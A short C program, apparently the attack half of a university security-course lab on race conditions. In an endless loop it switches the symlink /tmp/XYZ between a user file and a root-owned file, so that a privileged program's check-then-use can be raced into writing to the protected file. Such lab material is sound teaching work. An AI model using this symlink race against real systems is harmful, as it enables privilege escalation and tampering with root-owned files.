int main()
{
    while(1){
        system("ln -sf /home/mxgc/SJTU/LoCCS/Courses/SysSec2018Spring/labs/is308_labs/Lab3/race_condition/tmp_file /tmp/XYZ");
        system("ln -sf /home/mxgc/SJTU/LoCCS/Courses/SysSec2018Spring/labs/is308_labs/Lab3/race_condition/root_file /tmp/XYZ");
    }
    return 0;
}
